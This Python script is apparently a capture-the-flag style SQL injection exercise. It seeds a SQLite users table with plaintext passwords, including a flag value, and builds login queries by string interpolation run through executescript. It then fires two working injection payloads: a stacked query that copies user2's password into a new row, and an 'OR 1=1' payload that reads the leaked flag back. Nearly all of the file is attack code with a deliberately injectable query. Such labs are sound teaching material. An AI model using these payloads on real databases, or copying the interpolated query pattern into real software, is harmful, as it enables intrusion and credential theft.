import sqlite3

DATABASE = "test.db"

def get_db():
    """Get database connection, creating it if it doesn't exist"""
    try:
        db = sqlite3.connect(DATABASE)
        db.row_factory = sqlite3.Row
        return db, None
    except sqlite3.Error as e:
        return None, f"Database error: {str(e)}"

def init_db():
    """Initialize the database with tables"""
    try:
        db, error = get_db()
        if error:
            return error

        # create "users" table
        db.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                password TEXT NOT NULL
            )
        ''')
        users = [
            ('default', 'lookTheSecondUser'),
            ('admin', 'admin'), # default pass
            ('user1', 'iloveyou!'), # rockyou.txt
            ('user2', 'flag{SuPaSecUre_P@ssW0rd}')
        ]
        # Insert default users
        db.executemany("INSERT OR IGNORE INTO users (username, password) VALUES (?, ?)", users)

        db.commit()
        # db.close()
        return db, None
    except sqlite3.Error as e:
        print(e)
        return None, f"Database initialization error: {str(e)}"

db, error = init_db()

username = "1"
password = "';INSERT OR IGNORE INTO users (username, password) VALUES ((SELECT password FROM users WHERE username='user2' LIMIT 1), 'password')--"

try:
    query = f"SELECT username, password FROM users WHERE username='{username}' AND password='{password}'"
    db.executescript(query)

    cursor = db.execute(query)
    user = cursor.fetchone()
    print(username, password, user)

except Exception as e:
    print(e)


username = "1"
password = "'OR 1=1 AND password='password"

try:
    query = f"SELECT username, password FROM users WHERE username='{username}' AND password='{password}'"
    db.executescript(query)

    cursor = db.execute(query)
    user = cursor.fetchone()
    print(user['username'])

except Exception as e:
    print(e)
